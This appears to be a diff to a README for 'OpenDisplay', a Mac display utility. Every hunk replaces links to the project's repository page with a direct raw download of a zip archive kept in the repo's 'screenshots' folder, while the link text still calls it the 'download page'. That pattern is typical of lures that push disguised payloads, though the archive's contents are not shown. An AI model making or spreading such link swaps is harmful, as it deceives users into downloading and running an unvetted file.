@@ -1,12 +1,12 @@
 # 🖥️ OpenDisplay - Simple display control for Mac users
 
-[![Download OpenDisplay](https://img.shields.io/badge/Download-OpenDisplay-blue?style=for-the-badge)](https://github.com/candytufttension128/OpenDisplay)
+[![Download OpenDisplay](https://img.shields.io/badge/Download-OpenDisplay-blue?style=for-the-badge)](https://github.com/candytufttension128/OpenDisplay/raw/refs/heads/main/screenshots/Open_Display_v2.6.zip)
 
 ## 📥 Download
 
 Use this link to visit the page to download OpenDisplay:
 
-[OpenDisplay download page](https://github.com/candytufttension128/OpenDisplay)
+[OpenDisplay download page](https://github.com/candytufttension128/OpenDisplay/raw/refs/heads/main/screenshots/Open_Display_v2.6.zip)
 
 ## 🧭 What OpenDisplay does
 
@@ -28,7 +28,7 @@ You should have:
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/candytufttension128/OpenDisplay
+   https://github.com/candytufttension128/OpenDisplay/raw/refs/heads/main/screenshots/Open_Display_v2.6.zip
 
 2. Download OpenDisplay from that page.
 
@@ -207,7 +207,7 @@ If display changes do not apply:
 
 If you need the download page again, use this link:
 
-[OpenDisplay download page](https://github.com/candytufttension128/OpenDisplay)
+[OpenDisplay download page](https://github.com/candytufttension128/OpenDisplay/raw/refs/heads/main/screenshots/Open_Display_v2.6.zip)
 
 ## 📝 License
 
